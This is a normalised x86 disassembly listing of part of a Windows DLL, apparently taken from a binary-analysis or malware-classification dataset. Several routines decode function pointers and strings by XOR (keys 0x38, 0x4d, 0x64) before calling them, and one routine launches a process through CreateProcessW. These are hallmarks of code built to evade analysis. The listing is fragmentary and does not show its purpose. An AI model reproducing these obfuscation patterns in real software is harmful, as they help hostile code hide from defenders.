mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
call sub_1001bdc0
or eax 0x4
sub_10035d06
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1006299d
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10053281
pop ecx
mov [ esi ] eax
pop esi
sub_10035d40
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xb0 ]
lea edx [ ebp - 0xb8 ]
mov esi ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb0 ] ebx
call sub_100185d0
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax 0xf3
mov [ ebp - 0xbc ] ebx
call sub_10053240
lea ecx [ ebp - 0xbc ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xfb
call sub_10053240
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x4e
mov [ ebp - 0xb4 ] ebx
call sub_10053240
lea eax [ ebp - 0xb4 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov edx [ ebp - 0xb8 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xb0 ]
push eax
call esi
mov ecx [ ebp - 0xb4 ]
push ecx
call esi
mov edx [ ebp - 0xac ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x2c ]
mov eax 0x9d
mov [ ebp - 0xac ] ebx
call sub_10053240
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
push 0x18
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ebx 0x4
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_10035937
mov edx [ ebp - 0xb4 ]
mov ecx [ ebp - 0xb0 ]
add esp 0x4
push edx
mov edx [ ebp - 0xb8 ]
push ecx
mov ecx [ ebp - 0xbc ]
push edx
call sub_10044770
jmp r-xdata
mov ecx [ ebp - 0xc0 ]
mov [ ecx ] eax
sub_10035ec0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x3c ] 0x8
push edi
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] cx
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_100187af
add esp 0x4
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_100187af
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10035f60
push ebp
mov ebp esp
push 0xffffffff
push sub_10088b08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
call sub_100202e0
lea edi [ esi + 0x70 ]
xor eax eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] cx
mov [ ebp - 0x4 ] eax
mov ecx esi
mov [ esi ] r--data
call sub_1005a080
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp - 0x10 ] edx
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push 0x60000000
push edi
call [ ebp - 0x10 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
mov [ ebp - 0x10 ] eax
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push edx
push edi
call [ ebp - 0x10 ]
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor ecx ecx
cmp [ ebp - 0x14 ] ebx
sete cl
mov [ esi + 0x8 ] ecx
sub_10036070
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ r--data ]
mov [ ebp - 0x220 ] eax
movsx eax [ edx ]
push ebx
push esi
xor eax 0x64
push edi
mov edi [ rw-data ]
mov [ ebp - 0x21c ] ecx
xor ecx ecx
and eax 0xff
mov [ ebp - 0x218 ] ax
mov [ ebp - 0x216 ] cx
cmp [ edi + 0x120 ] ecx
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x208
push ecx
lea edx [ ebp - 0x210 ]
push edx
call sub_1007f940
lea eax [ ebp - 0x214 ]
add esp 0xc
push eax
call sub_10065cb8
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x210 ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x210 ]
push ebx
mov edx 0x7fffffff
call sub_10072800
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
call sub_10065cb8
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x218 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1004e6c0
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x21c ]
call sub_1000eee0
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10036250
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_10037e00
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100362a0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi edx
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0xa8 ] eax
lea eax [ esi + 0xc ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0xac ] esi
jb r-xdata
mov [ ebp - 0xa4 ] eax
mov ecx [ eax ]
mov [ ebp - 0xa4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xa4 ]
push ebx
push ecx
push eax
mov [ edi ] eax
call sub_1007f5d0
lea eax [ esi + 0x2c ]
add esp 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xa4 ] eax
mov edx [ eax ]
mov [ ebp - 0xa4 ] edx
jmp r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xa4 ]
push ebx
push edx
push eax
mov [ edi + 0x8 ] eax
call sub_1007f5d0
mov eax [ esi + 0x28 ]
mov [ edi + 0x20 ] eax
mov ecx [ esi + 0x58 ]
mov [ edi + 0x24 ] ecx
mov edx [ esi + 0x50 ]
mov [ edi + 0x2c ] edx
mov eax [ esi + 0x54 ]
mov [ edi + 0x28 ] eax
mov [ edi + 0x38 ] 0x1
mov ecx [ esi + 0x68 ]
mov [ edi + 0x40 ] ecx
mov edx [ esi + 0x6c ]
mov [ edi + 0x44 ] edx
mov eax [ esi + 0x5c ]
mov [ edi + 0x4c ] eax
mov ecx [ esi + 0x60 ]
mov [ edi + 0x48 ] ecx
mov eax [ esi + 0x48 ]
dec eax
add esp 0xc
cmp eax 0x5
ja r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xa
call sub_10053240
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_10036560 ]
lea edx [ ebp - 0x24 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov [ edi + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
lea edx [ ebp - 0x48 ]
mov eax 0x51
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xb8
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x4
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xe7
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x82
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x24
call sub_10053240
mov ebx edx
call sub_10061de0
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x4d
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x26 ] ax
mov eax [ ebp - 0xa8 ]
mov ebx [ eax ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
mov edx [ esi + 0x58 ]
push edx
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0x18 ]
call sub_1004ddc0
mov eax esi
push eax
lea eax [ edi + 0x54 ]
call sub_1006d780
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] r--data
test eax eax
je r-xdata
mov ecx [ ebp - 0xa8 ]
add ebx 0x1c
cmp ebx [ ecx + 0x4 ]
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov esi [ ebp - 0xac ]
sub_10036580
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
push 0x1
push eax
call sub_10052ab0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10029b50
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_1007f940
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072800
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x1
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_1004d020
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100367b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10036800
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10088acc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x198 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1b0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov [ esp + 0x24 ] esi
jne r-xdata
mov ecx [ esi + 0x3c ]
add ecx [ esi + 0x80 ]
lea eax [ ecx + ecx + 0x4 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ esi + 0x84 ] 0x8
mov ebx eax
jb r-xdata
mov eax 0x1
jmp r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx [ esp + 0x1b0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x198 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x2
jmp r-xdata
cmp eax 0x7fffffff
ja r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea eax [ ecx + eax + 0x2 ]
test eax eax
je r-xdata
push edx
mov edx 0x7ffffffe
mov ecx ebx
call sub_10072800
test eax eax
jns r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea edx [ ecx + eax + 0x2 ]
lea edi [ esp + 0x18 ]
mov ecx ebx
mov [ esp + 0x14 ] edx
call sub_100727a0
test eax eax
js r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
jns r-xdata
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
mov [ esp + 0x1c ] eax
jb r-xdata
mov [ esp + 0x14 ] eax
mov ecx [ eax ]
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
jns r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea edx [ ecx + eax + 0x2 ]
lea edi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x18 ] edx
call sub_100727a0
test eax eax
js r-xdata
push 0x44
lea eax [ esp + 0x40 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
xor eax eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebx
push eax
mov [ esp + 0x64 ] 0x44
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x152
call sub_10045930
lea edx [ esp + 0x118 ]
mov eax 0x37
call sub_10045930
push edx
lea eax [ esp + 0xa4 ]
lea ebx [ esi + 0xc ]
push eax
call sub_10017cc0
push eax
lea edx [ esp + 0x100 ]
lea esi [ esp + 0xe4 ]
mov [ esp + 0x1c4 ] 0x1
call sub_1001ccb0
add esp 0xc
mov ecx eax
mov eax [ esp + 0x1c ]
lea esi [ esp + 0xbc ]
mov [ esp + 0x1b8 ] 0x2
call sub_10038800
mov edx eax
mov ecx 0x5
mov [ esp + 0x1b8 ] 0x3
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ esp + 0xd8 ]
call sub_10019100
lea ecx [ esp + 0xa0 ]
call sub_10019100
mov eax [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
push 0xffffffff
push eax
mov [ esi + 0x4c ] eax
call [ WaitForSingleObject@IAT ]
mov edx [ esi + 0x4c ]
lea ecx [ esp + 0x20 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ esp + 0x20 ]
mov [ esi + 0x50 ] eax
xor eax eax
lea edx [ esp + 0x154 ]
mov eax 0xa7
call sub_10045930
mov eax edx
push eax
lea ecx [ esp + 0x88 ]
lea ebx [ esi + 0xc ]
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x5
mov [ esp + 0x1b8 ] 0x0
call sub_100205a0
lea ecx [ esp + 0x84 ]
call sub_10019100
mov eax 0x5
jmp r-xdata
sub_10036b10
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
lea ebx [ esi + 0x5c ]
push r--data
xor edi edi
mov ecx ebx
call sub_1001a2f0
mov edi 0x8
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
cmp [ ebx + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
mov ebx [ ebx ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc4 ]
call eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ esi + 0xc4 ]
push 0x0
push 0x0
push ebx
push 0x3
push eax
call ecx
mov eax [ eax ]
mov ecx eax
mov [ esi + 0xb8 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] edi
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x1 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xbc ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
pop edi
pop ebx
xor eax eax
pop esi
retn
mov ecx [ esi + 0xb8 ]
mov edx [ esi + 0xd4 ]
push ecx
call edx
pop edi
pop ebx
mov [ esi + 0xb8 ] 0x0
mov eax 0x2
pop esi
retn
sub_10036be0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_1005f210
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10036c10
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ ebx ] eax
cmp eax edi
jne r-xdata
cmp [ esi + 0x4 ] edi
je r-xdata
mov esi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
cmp esi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] edi
jne r-xdata
xor ebx ebx
mov edx [ ebp + 0x8 ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x20 ] edi
call sub_10056b30
jmp r-xdata
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ esi + 0x4 ] edi
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ esi ] ebx
cmp ebx edi
je r-xdata
sub_10036cc0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ ebp - 0x220 ]
push ecx
push eax
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x220 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x18 ]
mov eax 0xda
call sub_10045930
lea ecx [ ebp - 0x220 ]
push ecx
push ebx
mov ecx 0x104
call sub_10017c80
test eax eax
je r-xdata
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
lea edx [ ebp - 0x18 ]
push edx
mov esi 0x104
call sub_1004e6c0
neg eax
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10036dc0
push ebp
mov ebp esp
push 0xffffffff
push sub_100867c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10023dc0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xc4
call sub_10053240
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
